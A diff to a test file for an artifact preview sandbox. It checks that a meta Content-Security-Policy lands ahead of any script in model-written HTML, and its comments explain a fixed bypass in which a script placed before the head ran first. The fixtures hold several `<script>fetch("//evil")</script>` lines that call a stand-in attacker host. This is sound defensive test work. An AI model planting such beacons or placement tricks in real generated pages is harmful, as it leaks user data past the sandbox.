@@ -161,7 +161,11 @@ describe('artifact preview — the portable CSP reaches every document shape', (
     it('a full document with no <head> of its own still gets the policy', () => {
         const srcdoc = srcdocFor('<!doctype html><html><body>hi</body></html>');
         expect(srcdoc).toContain('http-equiv="Content-Security-Policy"');
-        expect(srcdoc, 'the head must be opened inside <html>').toContain('<html><head>');
+        // WHERE the head lands stopped mattering once the policy moved to the front:
+        // what matters is that nothing executable precedes it. This assertion used to
+        // pin the old placement, which is the placement that had the hole.
+        expect(srcdoc.indexOf('Content-Security-Policy'), 'the policy comes before the model markup')
+            .toBeLessThan(srcdoc.indexOf('<html'));
     });
 
     it('a document that BEGINS with <head> gets it too (index 0 is a match)', () => {
@@ -169,9 +173,42 @@ describe('artifact preview — the portable CSP reaches every document shape', (
         expect(srcdoc).toContain('http-equiv="Content-Security-Policy"');
     });
 
-    it('a document with a <head> keeps the old placement', () => {
+    it('a document with a <head> keeps the policy ahead of its content', () => {
         const srcdoc = srcdocFor('<!doctype html><html><head><title>T</title></head><body>hi</body></html>');
         expect(srcdoc).toContain('http-equiv="Content-Security-Policy"');
         expect(srcdoc.indexOf('Content-Security-Policy')).toBeLessThan(srcdoc.indexOf('<title>'));
     });
+
+    /**
+     * A `<meta http-equiv>` policy governs only what FOLLOWS it. So the question is
+     * never "is the meta there" — the three assertions above all answer that, and all
+     * three passed while the hole was open — it is "is anything executable ahead of
+     * it".
+     *
+     * The model writes the document. It may put a `<script>` before its own
+     * `<head>`, or before `<html>`, and the parser hoists that script into an
+     * implicitly-opened head where it sits EARLIER in document order than a meta
+     * inserted after the tag the model declared later. Reproduced end to end in
+     * Firefox, WebKit, and Chromium-without-the-csp-attribute: the beacon fired.
+     *
+     * The `csp` iframe attribute is Chromium-only, so on Firefox and Safari this
+     * meta is the ONLY containment the frame has.
+     */
+    const scriptShapes: Array<[string, string]> = [
+        ['a script before the model\'s own <head>', '<!doctype html><html><script>fetch("//evil")</script><head></head><body>x</body></html>'],
+        ['a script before <html>', '<!doctype html><script>fetch("//evil")</script><html><head></head><body>x</body></html>'],
+        ['a script and no head or html at all', '<!doctype html><script>fetch("//evil")</script><p>x</p>'],
+        ['a script before a head the model opens late', '<html><script>fetch("//evil")</script><head><title>T</title></head></html>'],
+    ];
+
+    for (const [label, doc] of scriptShapes) {
+        it(`puts the policy ahead of ${label}`, () => {
+            const srcdoc = srcdocFor(doc);
+            const policyAt = srcdoc.indexOf('Content-Security-Policy');
+            const scriptAt = srcdoc.indexOf('<script');
+            expect(policyAt, 'the policy must be present at all').toBeGreaterThan(-1);
+            expect(scriptAt, 'the fixture must actually contain a script').toBeGreaterThan(-1);
+            expect(policyAt, 'a meta CSP governs only what follows it').toBeLessThan(scriptAt);
+        });
+    }
 });
